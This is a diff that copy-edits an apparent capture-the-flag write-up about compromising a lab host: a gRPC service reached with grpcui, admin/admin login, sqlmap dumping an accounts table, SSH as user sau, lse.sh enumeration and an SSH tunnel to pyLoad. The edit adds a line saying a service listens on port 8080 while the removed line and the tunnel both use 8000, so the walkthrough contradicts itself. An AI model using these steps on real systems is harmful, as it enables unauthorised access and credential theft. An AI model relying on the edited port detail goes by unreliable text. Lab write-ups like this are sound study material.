@@ -1,11 +1,11 @@
-As always, started with 'ping -c4 10.10.11.214' to make sure I have connection to the target.
-'nmap -sVC -p- -T4 10.10.11.214' gave 'gost seems down' error so I used suggested -Pn switch.
+As always, started with 'ping -c4 10.10.11.214' to make sure I have a connection to the target.
+'nmap -sVC -p- -T4 10.10.11.214' gave a 'host seems down' error so I used the suggested -Pn switch.
 'nmap -sVC -Pn -p- -T4 10.10.11.214 --open -oN nmap_pc' gave better results, port 22 and 50051 seem open.
-Searching for the port 50051 on google indicates there might be 'gRPC' running
-Found 'grpcui' from github and I need 'go' to install it. After that is installed grpcui according to readme.
+Searching for port 50051 on google indicates there might be 'gRPC' running
+Found 'grpcui' from github and I need 'go' to install it. After that is installed grpcui according to the readme.
 './grpcui -plaintext 10.10.11.214:50051' opens up web ui page to the browser. I opened the same page on burp though.
-I registered user and then used 'LoginUser' with created username and password. It gave me id and token string.
-Tried same thing with username 'admin' password 'admin' and it worked. With proxy on burb I saved item to my pc.
+I registered user and then used 'LoginUser' with created username and password. It gave me the id and token string.
+Tried the same thing with username 'admin' password 'admin' and it worked. With proxy on burb I saved the item to my pc.
 
 With the file I used 'sqlmap -r pc_admin --dbs' to check if there is and vulnerability which there is.
 'sqlmap -r pc_admin --tables' finds out possible tables in the database. 
@@ -20,27 +20,27 @@ I want to look at 'accounts' table so 'sqlmap -r pc_admin -T "accounts" --column
 | password | TEXT |
 | username | TEXT |
 +----------+------+
-'sqlmap -r pc_admin -T "accounts" -C "username" --dump' dumps usernames from username column.
+'sqlmap -r pc_admin -T "accounts" -C "username" --dump' dumps usernames from the username column.
 +----------+
 | username |
 +----------+
 | admin    |
 | sau      |
 +----------+
-'sqlmap -r pc_admin -T "accounts" -C "password" --dump' does the same thing but for password column.
+'sqlmap -r pc_admin -T "accounts" -C "password" --dump' does the same thing but for the password column.
 +------------------------+
 | password               |
 +------------------------+
 | admin                  |
 | ********************** |
 +------------------------+
-Now we have username and password that we can try if they work for ssh.
+Now we have a username and password that we can try if they work for ssh.
 
-Indeed they do as I ssh'd in as sau. There was user.txt in /home/sau.
-Uploaded 'lse.sh' from my pc to target machine to help enumerating.
+Indeed they do as I ssh in as sau. There was user.txt in /home/sau.
+Uploaded 'lse.sh' from my pc to the target machine to help enumerate.
 There were 'Services listening only on localhost' so I used 'netstat -ant' to find out what they are.
+For some reason, there was a localhost listening on port 8080.
 
-127.0.0.1:8000 
 ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
 pyLoad
 
